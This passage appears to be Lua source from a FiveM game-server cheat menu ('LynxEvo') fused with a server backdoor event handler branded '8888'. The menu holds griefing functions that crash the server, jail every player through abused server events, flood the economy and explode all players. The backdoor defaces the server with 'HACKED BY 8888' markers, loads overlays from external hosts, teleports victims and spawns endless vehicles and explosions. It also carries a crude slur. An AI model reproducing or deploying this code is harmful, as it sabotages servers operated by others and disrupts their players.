		if LynxEvo.MenuButton("~h~~p~#~s~ Destroyer Menu", "Destroyer") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ESP Menu", "ESPMenu") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Crosshairs", "CsMenu") then elseif LynxEvo.CheckBox("~h~TriggerBot", TriggerBot, function(dR) TriggerBot = dR end) then elseif LynxEvo.CheckBox("~h~Player Blips", dx, function(dx) end) then cL = not cL; dx = cL elseif LynxEvo.CheckBox("~h~Name Above Players ~g~v1", cM, function(dR) cM = dR; cN = false end) then elseif LynxEvo.CheckBox("~h~Name Above Players n Indicator ~g~v2", cN, function(dR) cN = dR; cM = false end) then elseif LynxEvo.CheckBox("~h~~r~Freeze~s~ All players", freezeall, function(dR) freezeall = dR end) then elseif LynxEvo.CheckBox("~h~~r~Explode~s~ All players", blowall, function(dR) blowall = dR end) then elseif LynxEvo.Button("~h~~r~BORGAR~s~ Everyone") then
		for i = 0, 128 do
			if IsPedInAnyVehicle(GetPlayerPed(i), true)
		then local eb = "xs_prop_hamburgher_wl"
		local ec = GetHashKey(eb) while not HasModelLoaded(ec) do Citizen.Wait(0) RequestModel(ec) end;
		local ed = CreateObject(ec, 0, 0, 0, true, true, true) AttachEntityToEntity(ed, GetVehiclePedIsIn(GetPlayerPed(i), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
		else local eb = "xs_prop_hamburgher_wl"
		local ec = GetHashKey(eb) while not HasModelLoaded(ec) do Citizen.Wait(0) RequestModel(ec) end;
		local ed = CreateObject(ec, 0, 0, 0, true, true, true) AttachEntityToEntity(ed, GetPlayerPed(i), GetPedBoneIndex(GetPlayerPed(i), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end end elseif LynxEvo.Button("~h~~o~Discord RPC~s~ Add/Remove") then h = not h;
		if not h then SetRichPresence(0) SetDiscordAppId(0) SetDiscordRichPresenceAsset(0) SetDiscordRichPresenceAssetText(0)
		else e() end elseif LynxEvo.CheckBox("~h~~r~Ra~g~nd~b~om ~s~Notification Color", rgbnot, function(dR) rgbnot = dR end) then elseif LynxEvo.CheckBox("~h~~r~Confirms~s~ masterswitch", cO, function(dR) cO = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CsMenu") then
		if LynxEvo.CheckBox("~h~~y~Original ~s~Crosshair", crosshair, function(dR) crosshair = dR; crosshairc = false; crosshairc2 = false end) then elseif LynxEvo.CheckBox("~h~~r~CROSS ~s~Crosshair", crosshairc, function(dR) crosshair = false; crosshairc = dR; crosshairc2 = false end) then elseif LynxEvo.CheckBox("~h~~r~DOT ~s~Crosshair", crosshairc2, function(dR) crosshair = false; crosshairc = false; crosshairc2 = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("Destroyer") then
		if LynxEvo.Button("~h~~r~Nuke ~s~Server") then nukeserver() elseif LynxEvo.CheckBox("~h~~r~Silent ~s~Server ~y~Crasher", servercrasherxd, function(dR) servercrasherxd = dR end) then elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~v2") then esxdestroyv2() elseif LynxEvo.Button("~h~~g~ESX ~r~Destroy ~b~Salary") then EconomyDy2() elseif LynxEvo.Button("~h~~r~VRP ~s~Give everyone money") then vrpdestroy() elseif LynxEvo.Button("~h~~g~ESX ~s~Give everyone money") then giveeveryone() elseif LynxEvo.Button("~h~~r~Jail~s~ All players") then
		for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end elseif LynxEvo.Button("~h~~r~Banana ~p~Party~s~ All players") then bananapartyall() elseif LynxEvo.Button("~h~~r~Rape~s~ All players") then RapeAllFunc() elseif LynxEvo.Button("~h~~r~Cage~s~ All players") then
		for
		i = 0, 255 do x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do Citizen.Wait(0) RequestModel(GetHashKey("prop_fnclink_05crnr1")) end;
			local e9 = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false) local ea = CreateObject(GetHashKey("prop_fnclink_05crnr1"), roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false) SetEntityHeading(e9, -90.0) SetEntityHeading(ea, 90.0) FreezeEntityPosition(e9, true) FreezeEntityPosition(ea, true) end end;
		LynxEvo.Display() elseif LynxEvo.IsMenuOpened("crds") then
		if LynxEvo.Button("~h~~p~#~s~ Brutan~r~#~r~7799 ~p~DEV") then av("~h~~o~Dont click me BAKA!~s~.", false) av("Im a fag?", false) av("I had to take the liberty to modify this", false) elseif LynxEvo.Button("~h~~p~#~s~ antonio~r~#~r~3276 ~p~DEV") then elseif LynxEvo.Button("~h~~p~#~s~ unknown~r~#~r~9496 ~p~DEV") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponTypes") then
		for e0, ev in pairs(b7) do
			if LynxEvo.
		MenuButton("~h~~p~#~s~ "..e0, "WeaponTypeSelection") then dy = ev end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponTypeSelection") then
		for e0, ev in pairs(dy) do
			if LynxEvo.
		MenuButton(ev.name, "WeaponOptions") then dz = ev end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("WeaponOptions") then
		if LynxEvo.Button("~h~~r~Spawn Weapon") then GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false) end;
		if LynxEvo.Button("~h~~g~Add Ammo") then SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000) end;
		if LynxEvo.CheckBox("~h~~r~Infinite ~s~Ammo", dz.bInfAmmo, function(ew) end) then dz.bInfAmmo = not dz.bInfAmmo; SetPedInfiniteAmmo(GetPlayerPed(-1), dz.bInfAmmo, GetHashKey(dz.id)) SetPedInfiniteAmmoClip(GetPlayerPed(-1), true) PedSkipNextReloading(GetPlayerPed(-1)) SetPedShootRate(GetPlayerPed(-1), 1000) end;
		for e0, ev in pairs(dz.mods) do
			if LynxEvo.
		MenuButton("~h~~p~#~s~ ~h~~r~> ~s~"..e0, "ModSelect") then dA = ev end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ModSelect") then
		for _, ev in pairs(dA) do
			if LynxEvo.
		Button(ev.name) then GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id)) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CarTypes") then
		for i, ex in ipairs(b3) do
			if LynxEvo.
		MenuButton("~h~~p~#~s~ "..ex, "CarTypeSelection") then carTypeIdx = i end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CarTypeSelection") then
		for i, ex in ipairs(b4[carTypeIdx]) do
			if LynxEvo.
		MenuButton("~h~~p~#~s~ ~h~~r~>~s~ "..ex, "CarOptions") then carToSpawn = i end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("CarOptions") then
		if LynxEvo.Button("~h~~r~Spawn Car") then local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5)) local veh = b4[carTypeIdx][carToSpawn]
		if veh == nil then veh = "adder"
		end; vehiclehash = GetHashKey(veh) RequestModel(vehiclehash) Citizen.CreateThread(function() local ey = 0;
			while not HasModelLoaded(vehiclehash) do ey = ey + 100;
			Citizen.Wait(100) if ey > 5000 then ShowNotification("~h~~r~Cannot spawn this vehicle.") break end end; SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) SetVehicleStrong(SpawnedCar, true) SetVehicleEngineOn(SpawnedCar, true, true, false) SetVehicleEngineCanDegrade(SpawnedCar, false) end) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("MainTrailer") then
		if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
		for i, ex in ipairs(b5) do
			if LynxEvo.
		MenuButton("~h~~p~#~s~ ~h~~r~>~s~ "..ex, "MainTrailerSpa") then TrailerToSpawn = i end end
		else av("~h~~w~Not in a vehicle", true) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("MainTrailerSpa") then
		if LynxEvo.Button("~h~~r~Spawn Car") then local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5)) local veh = b5[TrailerToSpawn]
		if veh == nil then veh = "adder"
		end; vehiclehash = GetHashKey(veh) RequestModel(vehiclehash) Citizen.CreateThread(function() local ey = 0;
			while not HasModelLoaded(vehiclehash) do ey = ey + 100;
			Citizen.Wait(100) if ey > 5000 then ShowNotification("~h~~r~Cannot spawn this vehicle.") break end end; local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0) local ez = GetVehiclePedIsUsing(GetPlayerPed(-1)) AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0) SetVehicleStrong(SpawnedCar, true) SetVehicleEngineOn(SpawnedCar, true, true, false) SetVehicleEngineCanDegrade(SpawnedCar, false) end) end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("GiveSingleWeaponPlayer") then
		for i = 1, #b6 do
			if LynxEvo.
		Button(b6[i]) then GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESPMenu") then
		if LynxEvo.CheckBox("~h~~r~ESP ~s~MasterSwitch", esp, function(dR) esp = dR end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Box", espbox, function(dR) espbox = dR end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Info", espinfo, function(dR) espinfo = dR end) then elseif LynxEvo.CheckBox("~h~~r~ESP ~s~Lines", esplines, function(dR) esplines = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("LSC") then local veh = GetVehiclePedIsUsing(PlayerPedId()) if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning", "tunings") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~h~~r~Performance ~s~Tuning", "performance") then elseif LynxEvo.Button("~h~Change Car License Plate") then cu() elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour", RainbowVeh, function(dR) RainbowVeh = dR end) then elseif LynxEvo.Button("~h~Make vehicle ~y~dirty") then Clean(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.Button("~h~Make vehicle ~g~clean") then Clean2(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.CheckBox("~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(dR) rainbowh = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("BoostMenu") then
		if LynxEvo.ComboBox("~h~Engine ~r~Power ~s~Booster", dD, dB, dC, function(ag, ah) dB = ag; dC = ah; SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dC * 20.0) end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(dR) t2x = dR; t4x = false; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(dR) t2x = false; t4x = dR; t10x = false; t16x = false; txd = false; tbxd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~10x", t10x, function(dR) t2x = false; t4x = false; t10x = dR; t16x = false; txd = false; tbxd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~g~16x", t16x, function(dR) t2x = false; t4x = false; t10x = false; t16x = dR; txd = false; tbxd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~XD", txd, function(dR) t2x = false; t4x = false; t10x = false; t16x = false; txd = dR; tbxd = false end) then elseif LynxEvo.CheckBox("~h~Engine ~g~Torque ~s~Booster ~y~BIG XD", tbxd, function(dR) t2x = false; t4x = false; t10x = false; t16x = false; txd = false; tbxd = dR end) then end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 122) then
		if logged then LynxEvo.OpenMenu("LynxX") end; LynxEvo.Display() elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
		if logged then LynxEvo.OpenMenu("LynxX") end end; Citizen.Wait(0) end end) RegisterCommand("haha", function(eA, eB, eC) bv = true; RapeAllFunc() bananapartyall() EconomyDy2() AmbulancePlayers() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN RC4 ~ https://brutan.wixsite.com/fivem/fivem") end end, false) RegisterCommand("pk", function(eA, eB, eC) bw = false end, false) RegisterCommand("lol", function(eA, eB, eC) mhaonn = false end, false)
end)

RegisterNetEvent("8888-Backdoor-HackServer")
AddEventHandler("8888-Backdoor-HackServer", function()
	local blips = {
		{title="HACKED BY 8888", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY 8888", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY 8888", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY 8888", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
	 }
		 
	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 1.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 2.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 3.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 6.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 10.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 20.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 30.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 50.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 100.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	local sound = CreateDui("https://spambude.net/Dks/html/sound/sound.html", 50, 50); -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui

	local textureDic = CreateRuntimeTxd('duiTxd');

	local object = CreateDui("https://upfilesc.wwwnl1-ss11.a2hosted.com/cipher_vis12.html", 1920, 1080);
	local object = CreateDui("https://spambude.net/Dks/html/text_overlay/y.html", 1920, 1080);
	local object2 = CreateDui("https://spambude.net/Dks/html/lyxos_bug/lyxos_bug.html", 1920, 1080);  -- if the files getting deleted https://github.com/cashtwizzy/cipher-backdoor/tree/main/ui
	local object3 = CreateDui("https://spambude.net/Dks/html/overlay/screen3_2.html", 1920, 1080);

	local handle = GetDuiHandle(object) -- Gets DUI handle from object
	local handle2 = GetDuiHandle(object2) -- Gets DUI handle from object
	local handle3 = GetDuiHandle(object3) -- Gets DUI handle from object

	local showtext = true
	local chatspam = true
	local bypass = false
	local triggered = false

	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex", handle) -- Creates the texture "duiTex" in the "duiTxd" dictionary
	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex2", handle2) -- Creates the texture "duiTex" in the "duiTxd" dictionary
	CreateRuntimeTextureFromDuiHandle(textureDic, "duiTex3", handle3) -- Creates the texture "duiTex" in the "duiTxd" dictionary

	local chatColors = {{255, 0, 0}, {255, 128, 0}, {255, 255, 0}, {128, 255, 0}, {0, 255, 0}, {0, 255, 128}, {0, 255, 255}, {0, 128, 255}, {0, 0, 255}, {128, 0, 255}, {255, 0, 255}, {255, 0, 128}}
	local texts = {
	   "8888 - https://dsc.gg/8-8-8-8",
	   " 8888 - https://dsc.gg/8-8-8-8",
	   "  8888 - https://dsc.gg/8-8-8-8",
	   "   8888 - https://dsc.gg/8-8-8-8",
	   "    8888 - https://dsc.gg/8-8-8-8",
	   "     8888 - https://dsc.gg/8-8-8-8",
	   "      8888 - https://dsc.gg/8-8-8-8",
	   "       8888 - https://dsc.gg/8-8-8-8",
	   "        8888 - https://dsc.gg/8-8-8-8",
	   "         8888 - https://dsc.gg/8-8-8-8",
	   "          8888 - https://dsc.gg/8-8-8-8",
	   "           8888 - https://dsc.gg/8-8-8-8",
	   "            8888 - https://dsc.gg/8-8-8-8",
	   "             8888 - https://dsc.gg/8-8-8-8",
	   "              8888 - https://dsc.gg/8-8-8-8",
	   "               8888 - https://dsc.gg/8-8-8-8",
	   "                8888 - https://dsc.gg/8-8-8-8",
	   "                 8888 - https://dsc.gg/8-8-8-8",
	   "                  8888 - https://dsc.gg/8-8-8-8",
	   "                 8888 - https://dsc.gg/8-8-8-8",
	   "                8888 - https://dsc.gg/8-8-8-8",
	   "               8888 - https://dsc.gg/8-8-8-8",
	   "              8888 - https://dsc.gg/8-8-8-8",
	   "             8888 - https://dsc.gg/8-8-8-8",
	   "            8888 - https://dsc.gg/8-8-8-8",
	   "           8888 - https://dsc.gg/8-8-8-8",
	   "          8888 - https://dsc.gg/8-8-8-8",
	   "         8888 - https://dsc.gg/8-8-8-8",
	   "        8888 - https://dsc.gg/8-8-8-8",
	   "       8888 - https://dsc.gg/8-8-8-8",
	   "      8888 - https://dsc.gg/8-8-8-8",
	   "     8888 - https://dsc.gg/8-8-8-8",
	   "    8888 - https://dsc.gg/8-8-8-8",
	   "   8888 - https://dsc.gg/8-8-8-8",
	   "  8888 - https://dsc.gg/8-8-8-8",
	   " 8888 - https://dsc.gg/8-8-8-8",
	}

	Citizen.CreateThread(function()
	   while true do
		   Citizen.Wait(0)
		   --DrawRect(0.5, 0.5, 1.0, 1.0, 0, 0, 0, 255);
		   if(showtext)then
			   DrawSprite("duiTxd", "duiTex", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
		   else
			   DrawSprite("duiTxd", "duiTex2", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 120)
			   if(triggered == false)then
				   doActions()
				   triggered = true
			   end
		   end
		   SetFakeWantedLevel(6)
	   end
	end)

	Citizen.CreateThread(function()
	   if(bypass == false)then
		   Citizen.Wait(20300)
	   end

	   Citizen.CreateThread(function()
		   while true do
			   DrawSprite("duiTxd", "duiTex3", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
			   Citizen.Wait(1)
			   SetSuperJumpThisFrame(PlayerId())
			   SetEntityHealth(GetPlayerPed(-1), 200)
			   SetPedMoveRateOverride(PlayerId(),10.0)
			   SetRunSprintMultiplierForPlayer(PlayerId(),1.49)
		   end
	   end)

	   SetEntityCoords(GetPlayerPed(-1), 677.00207519531, 546.28833007813, 129.44534301758)
	SetPedComponentVariation(GetPlayerPed(-1), 1, 1, 0, 1) --put
	   ShakeGameplayCam("SKY_DIVING_SHAKE", 2.0)

	   StartScreenEffect("RaceTurbo", 0, true)

	   local model121 = GetHashKey("s_m_m_movalien_01")
	local player1 = PlayerId()

	   GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("gadget_parachute"), 1, false, false)
	   ApplyForceToEntity(GetPlayerPed(-1), 1, 9500.0, 3.0, 710000.0, 1.0, 0.0, 0.0, 1, false, true, false, false)

	   local vehicleName = 'jet'
	   if not IsModelInCdimage(vehicleName) or not IsModelAVehicle(vehicleName) then
		   return
	   end
	   RequestModel(vehicleName)
	   while not HasModelLoaded(vehicleName) do
		   Wait(150) -- often you'll also see Citizen.Wait
	   end

	   Citizen.CreateThread(function()
		   while true do
			   Citizen.Wait(15000)
			   ApplyForceToEntity(GetPlayerPed(-1), 1, 9500.0, 3.0, 710000.0, 1.0, 0.0, 0.0, 1, false, true, false, false)
		   end
	   end)

	   -- create the vehicle
	   Citizen.CreateThread(function()
		   Citizen.Wait(3000)
			   if math.random(1, 5) == 5 then
			   local playerPed = PlayerPedId() -- get the local player ped
			   local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
			   local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
			   while true do
				   Citizen.Wait(10000)
				   local playerPed = PlayerPedId() -- get the local player ped
				   local pos = GetEntityCoords(playerPed) -- get the position of the local player ped
				   local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z+100.0, GetEntityHeading(playerPed), true, false)
			   end
		   end
	   end)
	   chatspam = true
	   while not HasModelLoaded(model121) do
		   Wait(100)
	   end
	   SetPlayerModel(player1, model121)
	   SetModelAsNoLongerNeeded(model121)

	end)

	Citizen.CreateThread(function()
	   --print(GetEntityCoords(GetPlayerPed(-1), true))
	   if(bypass == false)then
		   Citizen.Wait(13300)
	   end
	   showtext = false
	   DestroyDui(object)

	end)

	function doActions()
	end



	function AddTextEntry(key, value)
	Citizen.InvokeNative(GetHashKey("ADD_TEXT_ENTRY"), key, value)
	end

	local config = {
	   ["TITLE"] = "~r~8888 - https://dsc.gg/8-8-8-8", 
	   ["SUBTITLE"] = "~r~8888 - https://dsc.gg/8-8-8-8",
	   ["MAP"] = "8888",
	   ["STATUS"] = "8888",
	   ["GAME"] = "8888",
	   ["INFO"] = "8888",
	   ["SETTINGS"] = "8888",
	   ["R*EDITOR"] = "8888",
	}

	Citizen.CreateThread(function()
	   while true do
	   Citizen.Wait(0)
		   N_0xb9449845f73f5e9c("SHIFT_CORONA_DESC")
		   PushScaleformMovieFunctionParameterBool(true)
		   PopScaleformMovieFunction()
		   N_0xb9449845f73f5e9c("SET_HEADER_TITLE")
		   PushScaleformMovieFunctionParameterString(config["TITLE"])
		   PushScaleformMovieFunctionParameterBool(true)
		   PushScaleformMovieFunctionParameterString(config["SUBTITLE"])
		   PushScaleformMovieFunctionParameterBool(true)
		   PopScaleformMovieFunctionVoid()
	   end
	end)


	-- Create Vehicles
	Citizen.CreateThread(function()
	   while true do
	   Citizen.Wait(1250)
			local ModelHash = "adder"
			CreateVehicle(ModelHash, 651.19805908203,576.09906005859,129.05094909668, 1, true, false)
			CreateVehicle(ModelHash, 695.63061523438,554.13635253906,132.46676635742, 1, true, false)
			CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
			CreateVehicle(ModelHash, 798.91400146484,573.09936523438,141.43251037598, 1, true, false)
			CreateVehicle(ModelHash, 923.92071533203,528.46606445313,119.71677398682, 1, true, false)
			CreateVehicle(ModelHash, 763.54248046875,443.96780395508,147.18112182617, 1, true, false)
			CreateVehicle(ModelHash, 680.24377441406,620.59802246094,170.31489562988, 1, true, false)
		end
	end)

	-- Explosion
	Citizen.CreateThread(function()
	   while true do
	   Citizen.Wait(500)
		   AddExplosion(651.19805908203,576.09906005859,129.05094909668, 5, 0, true, true, 1)
		   AddExplosion(695.63061523438,554.13635253906,132.46676635742, 5, 0, true, true, 1)
		   AddExplosion(680.24377441406,620.59802246094,170.31489562988, 5, 0, true, true, 1)
